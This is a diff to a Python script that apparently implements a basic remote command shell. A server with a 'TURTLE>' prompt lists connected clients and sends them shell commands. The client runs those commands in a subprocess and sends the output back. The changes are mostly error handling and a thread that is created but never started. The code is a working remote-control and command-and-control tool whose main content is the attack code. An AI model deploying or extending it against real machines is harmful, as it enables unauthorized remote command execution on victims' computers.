@@ -17,7 +17,7 @@ class Server(object):
 			self.s = socket.socket(family=socket.AF_INET)
 			print(NO_OF_THREADS)
 			self._run()
-		except socket.error as e:
+		except OSError as e:
 			print("Socket creation failed - ", str(e))
 
 	def socket_bind(self):
@@ -25,29 +25,35 @@ class Server(object):
 			self.s.bind((self.host, self.port))
 			print("Socket bound to port 1111")
 			self.s.listen(10)
-		except socket.error as e:
+		except OSError as e:
 			print("Socket bind failed - ", str(e))
 
 	def socket_accept(self):
-		while True:
-			try:
-				conn, addr = self.s.accept()
-				print('Connection established with host of IP ' + addr[0] + ' Port ' + str(addr[1]))
-				connections.append((conn, tuple(addr)))
-			except socket.error as e:
-				print("Failed to accept connection - ", str(e))
+		try:
+			while True:
+				try:
+					conn, addr = self.s.accept()
+					print('Connection established with host of IP ' + addr[0] + ' Port ' + str(addr[1]))
+					connections.append((conn, tuple(addr)))
+				except socket.error as e:
+					print("Failed to accept connection - ", str(e))
+		except KeyboardInterrupt as e:
+			pass
 
 	def start_prompt(self):
-		while True:
-			cmd = input('TURTLE>')
-			if cmd == 'list':
-				self.list_connections()
-			elif 'select' in cmd:
-				conn = self.get_target(cmd)
-				if conn is not None:
-					self.send_commands(conn)
-			else:
-				print("---Sorry! Command not recognized---")
+		try:
+			while True:
+				cmd = input('TURTLE>')
+				if cmd == 'list':
+					self.list_connections()
+				elif 'select' in cmd:
+					conn = self.get_target(cmd)
+					if conn is not None:
+						self.send_commands(conn)
+				else:
+					print("---Sorry! Command not recognized---")
+		except KeyboardInterrupt as e:
+			pass
 
 	def list_connections(self):
 		j = 0
@@ -73,23 +79,27 @@ class Server(object):
 		conn.send(str.encode('cd ./'))
 		response = str(conn.recv(1024), 'utf-8')
 		prompt = response
-		while True:
-			cmd = input(prompt+'> ')
-			if cmd == 'quit':
-				conn.close()
-				return
-			elif cmd[:2] == 'cd':
-				conn.send(str.encode(cmd))
-				response = str(conn.recv(1024), 'utf-8')
-				prompt = response
-			elif len(str.encode(cmd)) > 0:
-				conn.send(str.encode(cmd))
-				response = str(conn.recv(1024), 'utf-8')
-				print(response, end='')
+		try:
+			while True:
+				cmd = input(prompt+'> ')
+				if cmd == 'quit':
+					conn.close()
+					return
+				elif cmd[:2] == 'cd':
+					conn.send(str.encode(cmd))
+					response = str(conn.recv(1024), 'utf-8')
+					prompt = response
+				elif len(str.encode(cmd)) > 0:
+					conn.send(str.encode(cmd))
+					response = str(conn.recv(1024), 'utf-8')
+					print(response, end='')
+		except KeyboardInterrupt as e:
+			pass
 
 	def _run(self):
 		self.socket_bind()
-		self.socket_accept()
+		t = threading.Thread(name='Accept', target=self.socket_accept)
+		self.start_prompt()
 
 
 class Client(object):
@@ -117,6 +127,7 @@ class Client(object):
 				ouput_bytes = cmd.stdout.read() + cmd.stderr.read()
 				ouput_string= str(ouput_bytes, 'utf-8')
 				self.s.send(str.encode(ouput_string))
+			print(str(data))
 		self.s.close()
 
 choice = int(input('1-Server\t2-Client:\t'))
